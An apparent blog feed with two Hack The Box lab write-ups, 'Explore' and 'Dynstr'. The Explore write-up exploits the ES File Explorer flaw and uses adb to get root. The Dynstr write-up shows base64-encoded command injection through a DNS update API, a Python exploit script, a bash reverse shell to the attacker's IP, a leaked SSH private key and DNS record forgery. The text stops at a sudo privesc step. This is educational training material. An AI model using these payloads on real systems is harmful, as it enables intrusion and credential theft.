</div>]]></content></item><item><title>HTB - Explore</title><link>https://0xade1.github.io/posts/2021/10/htb-explore/</link><pubDate>Sun, 17 Oct 2021 02:40:41 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-explore/</guid><description>Exploration rustscan -a 10.10.10.247 -- -A -sCV Open 10.10.10.247:2222 Open 10.10.10.247:37889 Open 10.10.10.247:42135 Open 10.10.10.247:59777 PORT STATE SERVICE REASON VERSION 2222/tcp open ssh syn-ack (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: | 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqK2WZkEVE0CPTPpWoyDKZkHVrmffyDgcNNVK3PkamKs3M8tyqeFBivz4o8i9Ai8UlrVZ8mztI3qb+cHCdLMDpaO0ghf/50qYVGH4gU5vuVN0tbBJAR67ot4U+7WCcdh4sZHX5NNatyE36wpKj9t7n2XpEmIYda4CEIeUOy2Mm3Es+GD0AAUl8xG4uMYd2rdrJrrO1p15PO97/1ebsTH6SgFz3qjZvSirpom62WmmMbfRvJtNFiNJRydDpJvag2urk16GM9a0buF4h1JCGwMHxpSY05aKQLo8shdb9SxJRa9lMu3g2zgiDAmBCoKjsiPnuyWW+8G7Vz7X6nJC87KpL 37889/tcp open unknown syn-ack | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Sat, 16 Oct 2021 18:52:34 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: [.</description><content type="html"><![CDATA[<h2 id="exploration">Exploration</h2>
<pre><code>rustscan -a 10.10.10.247 -- -A -sCV
Open 10.10.10.247:2222
Open 10.10.10.247:37889
Open 10.10.10.247:42135
Open 10.10.10.247:59777

PORT      STATE SERVICE REASON  VERSION
2222/tcp  open  ssh     syn-ack (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|   2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqK2WZkEVE0CPTPpWoyDKZkHVrmffyDgcNNVK3PkamKs3M8tyqeFBivz4o8i9Ai8UlrVZ8mztI3qb+cHCdLMDpaO0ghf/50qYVGH4gU5vuVN0tbBJAR67ot4U+7WCcdh4sZHX5NNatyE36wpKj9t7n2XpEmIYda4CEIeUOy2Mm3Es+GD0AAUl8xG4uMYd2rdrJrrO1p15PO97/1ebsTH6SgFz3qjZvSirpom62WmmMbfRvJtNFiNJRydDpJvag2urk16GM9a0buF4h1JCGwMHxpSY05aKQLo8shdb9SxJRa9lMu3g2zgiDAmBCoKjsiPnuyWW+8G7Vz7X6nJC87KpL
37889/tcp open  unknown syn-ack
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 16 Oct 2021 18:52:34 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
[..]
42135/tcp open  http    syn-ack ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open  http    syn-ack Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.80%I=7%D=10/16%Time=616B1B5B%P=x86_64-alpine-linux-mus
SF:l%r(NULL,24,&quot;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&quot;);
Service Info: Device: phone
</code></pre>
<h2 id="gobuster">gobuster</h2>
<h3 id="tcp59777">TCP/59777</h3>
<p>it looks like a unix file system:</p>
<pre><code>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.247:59777/
[+] Threads:        10
[+] Wordlist:       /opt/dictionaries/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/10/17 03:00:12 Starting gobuster
===============================================================
/product (Status: 301)
/data (Status: 301)
/d (Status: 301)
/bin (Status: 301)
/storage (Status: 301)
/system (Status: 301)
/lib (Status: 301)
/dev (Status: 301)
/cache (Status: 301)
/etc (Status: 301)
/vendor (Status: 301)
/config (Status: 301)
/oem (Status: 301)
/%20 (Status: 403)
/sys (Status: 301)
/init (Status: 403)
/acct (Status: 301)
/proc (Status: 301)
</code></pre>
<h1 id="searchsploit">Searchsploit</h1>
<pre><code>searchsploit es file explorer
</code></pre>
<table>
<thead>
<tr>
<th>Exploit Title</th>
<th>Path</th>
</tr>
</thead>
<tbody>
<tr>
<td>ES File Explorer 4.1.9.7.4 - Arbitrary File</td>
<td>android/remote/50070.py</td>
</tr>
</tbody>
</table>
<pre><code>searchsploit -m 50070
</code></pre>
<p>This is a smartphone exploit, and we can retrieve the gobuster results and more with the exploit:</p>
<pre><code>python3 ./50070.py listFiles 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : lib
time : 3/25/20 05:12:02 AM
type : folder
size : 12.00 KB (12,288 Bytes)

name : system
time : 3/25/20 12:12:31 AM
type : folder
size : 4.00 KB (4,096 Bytes)

name : sys
time : 10/16/21 02:18:34 PM
type : folder
size : 0.00 Bytes (0 Bytes)

name : storage
time : 10/16/21 02:18:38 PM
type : folder
size : 80.00 Bytes (80 Bytes)
</code></pre>
<p>The pictures contains creds we can download: <code>kristi:Kr1sT!5h@Rp3xPl0r3!</code></p>
<pre><code>python3 ./50070.py listPics 10.10.10.247
[..]
name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

python3 ./50070.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
[..]
[+] Downloading file...
[+] Done. Saved as `out.dat`.
</code></pre>
<p>We are successful to ssh with this password:</p>
<pre><code>$ ssh -p 2222 kristi@10.10.10.247
Password authentication
Password:
:/ $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
</code></pre>
<p>User Flag</p>
<pre><code>:/ $ ls sdcard/
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
Android Download Music  Pictures      Ringtones dianxinos
:/ $ cat sdcard/user.txt
f32017174c7c7e8f50c6da52891ae250
</code></pre>
<h2 id="privesc">PrivESC</h2>
<h3 id="exploration-1">exploration</h3>
<pre><code>:/ $ netstat -anlp | egrep  LISTEN
tcp6       0      0 :::59777                :::*                    LISTEN      -
tcp6       0      0 ::ffff:127.0.0.1:42505  :::*                    LISTEN      -
tcp6       0      0 :::2222                 :::*                    LISTEN      4440/net.xnano.android.sshserver
tcp6       0      0 :::5555                 :::*                    LISTEN      -
tcp6       0      0 :::42135                :::*                    LISTEN      -
tcp6       0      0 ::ffff:10.10.10.2:39577 :::*                    LISTEN      -
</code></pre>
<p>port 5555 is used for android debugger, we can ssh forward it, then use <code>adb</code> commandline to become root:</p>
<pre><code>ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247
</code></pre>
<p>From attacker machine, we can connect the remote device, list available devices and spawn a shell:</p>
<pre><code>adb connect 127.0.0.1:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to 127.0.0.1:5555

adb devices -l
List of devices attached
127.0.0.1:5555         device product:android_x86_64 model:VMware_Virtual_Platform device:x86_64 transport_id:2
emulator-5554          device product:android_x86_64 model:VMware_Virtual_Platform device:x86_64 transport_id:1

adb -t 2 shell
x86_64:/ $
</code></pre>
<p>adb can get superpower with <code>su</code> command</p>
<pre><code>x86_64:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
x86_64:/ $ su
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
</code></pre>
<p>Find the root flag:</p>
<pre><code>x86_64:/ $ su
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
:/ # find /data -name &quot;root.txt&quot;
/data/root.txt
:/ # cat /data/root.txt
f04fc82b6d49b41c9b08982be59338c5
</code></pre>
]]></content></item><item><title>HTB - Dynstr</title><link>https://0xade1.github.io/posts/2021/10/htb-dynstr/</link><pubDate>Sat, 16 Oct 2021 22:18:20 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-dynstr/</guid><description>Exploration $ nmap -p- --min-rate 3000 -v -T4 10.10.10.244 22/tcp open ssh 53/tcp open domain 80/tcp open http $ nmap -p22,53,80 -sCV 10.10.10.244 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) | dns-nsid: |\_ bind.version: 9.16.1-Ubuntu 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |\_http-server-header: Apache/2.4.41 (Ubuntu) |\_http-title: Dyna DNS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web exploration reveals:</description><content type="html"><![CDATA[<h2 id="exploration">Exploration</h2>
<pre><code>$ nmap -p- --min-rate 3000 -v -T4 10.10.10.244
22/tcp open ssh
53/tcp open domain
80/tcp open http

$ nmap -p22,53,80 -sCV 10.10.10.244
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|\_ bind.version: 9.16.1-Ubuntu
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-server-header: Apache/2.4.41 (Ubuntu)
|\_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>Web exploration reveals:</p>
<ul>
<li>one email address and its domain: <a href="mailto:dns@dyna.htb">dns@dyna.htb</a></li>
<li>three other domains:
<ul>
<li>dnsalias.htb</li>
<li>dynamicdns.htb</li>
<li>no-ip.htb</li>
</ul>
</li>
<li>we learn this website is using the same API as no-ip.com with shared creds:
<ul>
<li>Username: dynadns</li>
<li>Password: sndanyd</li>
</ul>
</li>
</ul>
<p>a bit of research, we find the API details in <a href="https://www.noip.com/integrate/request">https://www.noip.com/integrate/request</a>. The API entrypoint is <strong>/nic/update</strong> so we can prepare Burp and play a bit with it.</p>
<h3 id="dns-exploration">DNS exploration:</h3>
<pre><code>dig axfr @10.10.10.244 dyna.htb
[..]
; Transfer failed.

dig ANY @10.10.10.244 dyna.htb
[..]
;; ANSWER SECTION:
dyna.htb. 60 IN SOA dns1.dyna.htb. hostmaster.dyna.htb. 2021030303 21600 3600 604800 60
dyna.htb. 60 IN NS dns1.dyna.htb.

;; ADDITIONAL SECTION:
dns1.dyna.htb. 60 IN A 127.0.0.1
</code></pre>
<h3 id="spot-the-blind-command-injection">Spot the Blind Command Injection</h3>
<p>We are able to execute command as the <code>echo a</code> is converted in <code>a</code> and I can successfully leverage the API to register my ip address a.dnsalias.htb. However this is a blind command injection because I cannot get the command ouput:</p>
<pre><code>GET /nic/update?hostname=`echo+a`.dnsalias.htb&amp;myip=10.10.14.51 HTTP/1.1
Host: 10.10.10.244
Authorization: Basic ZHluYWRuczpzbmRhbnlk
</code></pre>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nslookup

&gt; server dyna.htb
&gt; Default server: dyna.htb
&gt; Address: 10.10.10.244#53
&gt; a.dnsalias.htb
&gt; Server: dyna.htb
&gt; Address: 10.10.10.244#53
</code></pre></td></tr></table>
</div>
</div><p>The command injection works but there is too many forbidden character for a domain, let&rsquo;s try base64</p>
<h3 id="base64-poc">Base64 PoC</h3>
<p>prepare base64 payload:</p>
<pre><code>echo &quot;echo q&quot; | base64
ZWNobyBxCg==
</code></pre>
<p>Send the payload</p>
<pre><code>GET /nic/update?hostname=`echo+ZWNobyBxCg==+|+base64+-d+|+bash`.dnsalias.htb&amp;myip=10.10.14.51 HTTP/1.1
Host: 10.10.10.244
Authorization: Basic ZHluYWRuczpzbmRhbnlk
</code></pre>
<p>We are successful:</p>
<pre><code>nslookup
[..]

&gt; b.dnsalias.htb
&gt; Server: dyna.htb
&gt; Address: 10.10.10.244#53
</code></pre>
<p>So we have confirmation it works, make it python then let&rsquo;s see if we have a ping back:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">import</span> sys
<span style="color:#ff79c6">import</span> requests
<span style="color:#ff79c6">from</span> requests.auth <span style="color:#ff79c6">import</span> HTTPBasicAuth
<span style="color:#ff79c6">from</span> base64 <span style="color:#ff79c6">import</span> b64encode

<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(sys<span style="color:#ff79c6">.</span>argv):
    payload<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39; &#39;</span><span style="color:#ff79c6">.</span>join(sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">1</span>:])
<span style="color:#ff79c6">else</span>:
    payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;ping -c 1 10.10.14.51&#34;</span>

payload <span style="color:#ff79c6">=</span> b64encode(payload<span style="color:#ff79c6">.</span>encode())<span style="color:#ff79c6">.</span>decode()

url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://dyna.htb/nic/update&#39;</span>
auth<span style="color:#ff79c6">=</span>HTTPBasicAuth(<span style="color:#f1fa8c">&#39;dynadns&#39;</span>,<span style="color:#f1fa8c">&#39;sndanyd&#39;</span>)

params <span style="color:#ff79c6">=</span> {
        <span style="color:#f1fa8c">&#39;myip&#39;</span> : <span style="color:#f1fa8c">&#39;10.10.14.51&#39;</span>,
        <span style="color:#f1fa8c">&#39;hostname&#39;</span>: <span style="color:#f1fa8c">&#39;`echo &#34;</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34; | base64 -d | bash`a.no-ip.htb&#39;</span><span style="color:#ff79c6">.</span>format(payload),
}

response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url, params<span style="color:#ff79c6">=</span>params, auth<span style="color:#ff79c6">=</span>auth, verify<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
<span style="color:#8be9fd;font-style:italic">print</span>(response)
</code></pre></td></tr></table>
</div>
</div><p>We start a tcpdump listener and we execute the script to see icmp echo reply:</p>
<pre><code>python3 dyna.py ping -c 1 10.10.14.51
-----------------------------------------------------------------------------------------
tcpdump -i utun3 -n icmp
00:34:57.582721 IP 10.10.10.244 &gt; 10.10.14.51: ICMP echo request, id 1, seq 1, length 64
00:34:57.582823 IP 10.10.14.51 &gt; 10.10.10.244: ICMP echo reply, id 1, seq 1, length 64
00:34:57.686954 IP 10.10.10.244 &gt; 10.10.14.51: ICMP echo request, id 2, seq 1, length 64
00:34:57.687016 IP 10.10.14.51 &gt; 10.10.10.244: ICMP echo reply, id 2, seq 1, length 64
</code></pre>
<p>Let&rsquo;s make it a reverse shell:</p>
<pre><code>python3 dyna.py &quot;bash -i &amp;&gt; /dev/tcp/10.10.14.51/80 0&gt;&amp;1&quot;
-----------------------------------------------------------------------------------------
id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>www-data@dynstr:/var/www/html/nic$ ls -la /home
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 2021 bindmgr
drwxr-xr-x 3 dyna dyna 4096 Mar 18 2021 dyna</p>
<p>www-data@dynstr:/var/www/html/nic$ ls -la /home/bindmgr
lrwxrwxrwx 1 bindmgr bindmgr 9 Mar 15 2021 .bash_history -&gt; /dev/null
-rw-r&ndash;r&ndash; 1 bindmgr bindmgr 220 Feb 25 2020 .bash_logout
-rw-r&ndash;r&ndash; 1 bindmgr bindmgr 3771 Feb 25 2020 .bashrc
drwx&mdash;&mdash; 2 bindmgr bindmgr 4096 Mar 13 2021 .cache
-rw-r&ndash;r&ndash; 1 bindmgr bindmgr 807 Feb 25 2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 2021 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 2021 support-case-C62796521
-r&mdash;&mdash;&ndash; 1 bindmgr bindmgr 33 Oct 15 07:03 user.txt</p>
<p>the private key id_rsa can&rsquo;t be read, but the authorized_keys has interesting information:</p>
<p>www-data@dynstr:/var/www/html/nic$ ls -la /home/bindmgr/.ssh/
-rw-r&ndash;r&ndash; 1 bindmgr bindmgr 419 Mar 13 2021 authorized_keys
-rw&mdash;&mdash;- 1 bindmgr bindmgr 1823 Mar 13 2021 id_rsa
-rw-r&ndash;r&ndash; 1 bindmgr bindmgr 395 Mar 13 2021 id_rsa.pub
-rw-r&ndash;r&ndash; 1 bindmgr bindmgr 444 Mar 13 2021 known_hosts</p>
<p>it informs us that this machine will only accept the private key if it comes from *.infra.dyna.htb</p>
<p>www-data@dynstr:/var/www/html/nic$ cat /home/bindmgr/.ssh/authorized_keys
cat /home/bindmgr/.ssh/authorized_keys
from=&quot;*.infra.dyna.htb&quot; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen</p>
<p>We can find a support ticket with an strace command containing the private key:</p>
<p>www-data@dynstr:/var/www/html/nic$ ls -la /home/bindmgr/support-case-C62796521
-rw-r&ndash;r&ndash; 1 bindmgr bindmgr 237141 Mar 13 2021 C62796521-debugging.script
-rw-r&ndash;r&ndash; 1 bindmgr bindmgr 29312 Mar 13 2021 C62796521-debugging.timing
-rw-r&ndash;r&ndash; 1 bindmgr bindmgr 1175 Mar 13 2021 command-output-C62796521.txt
-rw-r&ndash;r&ndash; 1 bindmgr bindmgr 163048 Mar 13 2021 strace-C62796521.txt</p>
<p>We find the private key in the strace output:</p>
<p>15123 openat(AT_FDCWD, &ldquo;/home/bindmgr/.ssh/id_rsa&rdquo;, O_RDONLY) = 5
15123 fstat(5, {st_mode=S_IFREG|0600, st_size=1823, &hellip;}) = 0
15123 read(5, &ldquo;&mdash;&ndash;BEGIN OPENSSH PRIVATE KEY&mdash;&ndash;\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n&mdash;&ndash;END OPENSSH PRIVATE KEY&mdash;&ndash;\n&rdquo;, 4096) = 1823</p>
<p>Now that we have copied the private key, we still have to address the *.infra.dyna.htb limitation:</p>
<p>www-data@dynstr:/var/www/html/nic$ cat /etc/bind/infra.key
key &ldquo;infra-key&rdquo; {
algorithm hmac-sha256;
secret &ldquo;7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=&quot;;
};</p>
<p>With the secret key we can bind out record into DNS:</p>
<pre><code>www-data@dynstr:/var/www/html/nic$ nsupdate -k /etc/bind/infra.key
update add lol.infra.dyna.htb 86400 A 10.10.14.51
update add 51.14.10.10.in-addr.arpa 86400 PTR lol.infra.dyna.htb
show
Outgoing update query:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
lol.infra.dyna.htb.     86400   IN      A       10.10.14.51
51.14.10.10.in-addr.arpa. 86400 IN      PTR     lol.infra.dyna.htb.

send
update failed: NOTZONE
quit
</code></pre>
<p>The update failsed because we did not leave an empty line after addition of the A record. We try again:</p>
<pre><code>www-data@dynstr:/var/www/html/nic$ nsupdate -k /etc/bind/infra.key
update add lol.infra.dyna.htb 86400 A 10.10.14.51

update add 51.14.10.10.in-addr.arpa 86400 PTR lol.infra.dyna.htb
show
Outgoing update query:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
51.14.10.10.in-addr.arpa. 86400 IN      PTR     lol.infra.dyna.htb.

send
quit
</code></pre>
<p>Let&rsquo;s verify:</p>
<pre><code>$ nslookup
&gt; server 10.10.10.244
Default server: 10.10.10.244
Address: 10.10.10.244#53
&gt; lol.infra.dyna.htb
Server:         10.10.10.244
Address:        10.10.10.244#53

Name:   lol.infra.dyna.htb
Address: 10.10.14.51
</code></pre>
<p>Good, we can now remotely ssh:</p>
<pre><code>ssh -i id_rsa_dynster bindmgr@dyna.htb
Last login: Sat Oct 16 18:47:51 2021 from aaa.infra.dyna.htb
bindmgr@dynstr:~$id
uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
</code></pre>
<h2 id="privesc">Privesc</h2>
<h3 id="sudoers-file">sudoers file</h3>
<pre><code>bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
(ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
</code></pre>
<p>The script needs a .version file otherwise it will exit:</p>
<pre><code>if [[ ! -f .version ]] ; then
    echo &quot;[-] ERROR: Check versioning. Exiting.&quot;
    exit 42
fi
</code></pre>
<p>Then it will execute the vulnerable code:</p>
<pre><code>cp .version * /etc/bind/named.bindmgr/
</code></pre>
